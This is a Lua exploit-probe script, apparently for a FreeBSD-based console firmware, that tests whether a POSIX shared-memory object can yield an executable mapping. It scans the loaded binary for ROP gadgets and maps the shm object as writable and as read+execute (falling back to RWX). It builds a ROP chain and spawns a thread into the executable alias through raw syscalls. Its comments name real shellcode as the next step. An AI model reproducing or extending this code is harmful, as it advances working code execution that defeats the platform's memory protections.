-- CRASH_CLASS: HIGH
-- PROBE 934a: can a shm object give us an executable mapping?
--
-- 928c established that the thread-entry mechanism is sound for any executable
-- address (entering the `store` gadget ran, wrote 0x1234, fell into the chain
-- and exited) and that entering a page of anonymous GPU memory faults. So
-- anonymous mappings are NX.
--
-- The one shape not yet tried is a mapping the kernel might treat differently:
-- a POSIX shm object, which shm_open(482) really creates on this firmware
-- (58d). Map it twice - once writable to place the code, once read+execute -
-- and enter the execute alias.
--
-- If the process survives with the chain having run, user memory can execute
-- and the next step is real shellcode. If it dies at the entry, the answer is
-- no for shared file-backed mappings too.

print("=== PROBE 934a: shm RX page ===")

local function to_num(v)
    if type(v)=="table" then
        if v.tonumber then local n=v:tonumber() if n then return n end end
        if v.h then return v.h*4294967296+v.l end
    end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function rb(a) local o,v=pcall(function() return memory.read_byte(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function wb(a,v) pcall(function() memory.write_byte(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end

local fn = to_num(syscall.pipe.fn_addr)
print("[0] pid=" .. tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))

local info = memory.alloc(0x200); wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info+0x10C) or 0) * 4294967296 + (rd(info+0x108) or 0)
local function find_pat(base, limit, pat)
    local off = 0
    while off < limit do
        local want = limit - off
        if want > 0x1000 then want = 0x1000 end
        local ok, s = pcall(function() return memory.read_buffer(base+off, want) end)
        if not ok or type(s) ~= "string" then return nil end
        local i = string.find(s, pat, 1, true)
        if i then return base + off + i - 1 end
        off = off + want
    end
end
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58, 0xC3))
local pop_rdi = find_pat(ebase, 0x494000, string.char(0x5F, 0xC3))
local store   = find_pat(ebase, 0x494000, string.char(0x48, 0x89, 0x07, 0xC3))
local jmp_g   = find_pat(ebase, 0x494000, string.char(0xEB, 0xFE))
if not (pop_rax and pop_rdi and store and jmp_g) then print("[!] no gadgets"); return end
print(string.format("[0] rax=%X rdi=%X store=%X jmp=%X", pop_rax, pop_rdi, store, jmp_g))

local PAGE = 0x4000
local sc_shm_open  = mk(482)
local sc_shm_unlink= mk(483)
local sc_ftruncate= mk(480)
local sc_mmap      = mk(477)
local sc_munmap    = mk(73)

--------------------------------------------------------------------
-- A: the object
--------------------------------------------------------------------
print("--- A: shm object ---")
local name = "/ex934a_" .. tostring(os.time())
local ok, fd = pcall(function()
    return sc_shm_open(name, uint64(2 + 0x200), uint64(0x1FF))   -- O_RDWR|O_CREAT
end)
fd = to_num(fd)
print("  shm_open ok=" .. tostring(ok) .. " fd=" .. fd .. " name=" .. name)
if not ok or fd < 0 then print("[!] no shm object - stopping"); return end
local okft, rft = pcall(function() return sc_ftruncate(uint64(fd), uint64(PAGE)) end)
print("  ftruncate ok=" .. tostring(okft) .. " rv=" .. tostring(to_num(rft)))

--------------------------------------------------------------------
-- B: writable alias, place the code
--------------------------------------------------------------------
print("--- B: RW alias ---")
local okw, wa = pcall(function()
    return sc_mmap(uint64(0), uint64(PAGE), uint64(3), uint64(1), uint64(fd), uint64(0))
end)
wa = to_num(wa)
print("  RW mmap ok=" .. tostring(okw) .. " addr=" .. string.format("%X", wa))
if wa == 0 then print("[!] RW mmap failed - stopping"); return end
wb(wa, 0xC3); wb(wa + 1, 0); wb(wa + 2, 0); wb(wa + 3, 0)
print(string.format("  wrote dword=%X (want C3)", rd(wa) or 0))

--------------------------------------------------------------------
-- C: execute alias
--------------------------------------------------------------------
print("--- C: RX alias ---")
local okx, xa = pcall(function()
    return sc_mmap(uint64(0), uint64(PAGE), uint64(5), uint64(1), uint64(fd), uint64(0))
end)
xa = to_num(xa)
print("  RX mmap (prot=5) ok=" .. tostring(okx) .. " addr=" .. string.format("%X", xa))
if xa == 0 then
    local ok7, x7 = pcall(function()
        return sc_mmap(uint64(0), uint64(PAGE), uint64(7), uint64(1), uint64(fd), uint64(0))
    end)
    x7 = to_num(x7)
    print("  RWX mmap (prot=7) ok=" .. tostring(ok7) .. " addr=" .. string.format("%X", x7))
    xa = x7
end
if xa == 0 then print("[!] no execute alias - stopping, nothing to run"); return end
print(string.format("  read through alias = %X (want C3)", rb(xa) or 0))

--------------------------------------------------------------------
-- D: stack and chain
--------------------------------------------------------------------
print("--- D: stack ---")
local _, sb = pcall(function()
    return sc_mmap(uint64(0), uint64(PAGE * 4), uint64(3), uint64(0x1002),
        uint64(0xFFFFFFFF), uint64(0))
end)
local block = to_num(sb)
if block == 0 then print("[!] stack mmap failed - stopping"); return end
local start = block + PAGE * 4 - 0x200
zero(block, PAGE * 4)
local out = block + 0x100
local ch = {pop_rdi, out, pop_rax, 20, fn, store, pop_rdi, 0, pop_rax, 431, fn, jmp_g}
for k = 1, #ch do wq(start + (k - 1) * 8, uint64(ch[k])) end
print(string.format("  block=%X start=%X out=%X", block, start, out))

local Ctx = {MAGIC=0x108, TYPE=0x110, CS=0x0C0, RIP=0x0E0, RSP=0x0F8,
             SS=0x100, RDI=0x048, RAX=0x078}
local ctx = memory.alloc(0x500)
local tb  = memory.alloc(8)
zero(ctx, 0x500); wq(tb, uint64(0))
wq(ctx+Ctx.MAGIC, uint64(0x480)); wq(ctx+Ctx.TYPE, uint64(0x10000))
wq(ctx+Ctx.CS, uint64(0x43));    wq(ctx+Ctx.SS, uint64(0x3B))
wq(ctx+Ctx.RIP, uint64(xa));     wq(ctx+Ctx.RSP, uint64(start))
wq(ctx+Ctx.RDI, uint64(0));      wq(ctx+Ctx.RAX, uint64(20))

--------------------------------------------------------------------
-- E: the oracle
--------------------------------------------------------------------
print("--- E: spawn into the shm alias ---")
print(string.format("  [BEFORE] entry=%X", xa))
local okS, rvS = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
local ts = memory.alloc(16)
wq(ts, uint64(0)); wq(ts + 8, uint64(150 * 1000000))
pcall(function() mk(240)(uint64(ts), uint64(0)) end)
print(string.format("  [AFTER ] ok=%s rv=%d out=%d alive=%d",
    tostring(okS), to_num(rvS), rd(out) or -1,
    to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))
print("[Z] SURVIVED - a shm mapping of ours executed")
print("=== PROBE 934a COMPLETE ===")
